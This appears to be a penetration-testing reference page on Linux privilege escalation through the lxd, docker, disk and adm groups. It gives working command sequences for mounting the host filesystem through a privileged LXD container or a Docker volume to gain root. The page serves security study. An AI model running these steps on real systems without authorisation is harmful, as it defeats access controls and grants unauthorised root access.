---
title: Privileged Groups
description: Exploit highly-privileged group membership to obtain root access.
categories: [Privilege Escalation]
tags: [Privilege Escalation, Linux, Docker, LXC/LXD]
weight: 2
---
Certain groups give their members high privileges that can be abused to obtain root access on the host. Below are some examples:

## LXC/LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group.
```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Membership in the LXD group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`.

```bash
# Import local container image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# Start a privileged container
lxc init alpine r00t -c security.privileged=true
# Mount host filesystem
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start r00t
# Spawn an interactive shell inside the container
lxc exec r00t /bin/sh
```

This allows us to read all files inside the host file system as root. We may also leverage the [**setuid bash**]({{< relref "/docs/priv_esc/linux/permission/suid/#bash-with-setuid">}}) technique to gain root interactive shell on the host system.

## Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without a password. Members of the docker group can spawn new docker containers, and mount local file systems.
```bash
docker run -v /root:/mnt -it ubuntu
```
This allows us to read all files inside the host file system as root. We may also leverage the [**setuid bash**]({{< relref "/docs/priv_esc/linux/permission/suid/#bash-with-setuid">}}) technique to gain root interactive shell on the host system.

## Disk
Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`.
- Attackers can use `debugfs` to access the entire file system with root-level privs.

## ADM
Members of the `adm` group can read all logs under `/var/log`. This does not automatically grant root acccess, but can be leveraged to gather sensitive information.
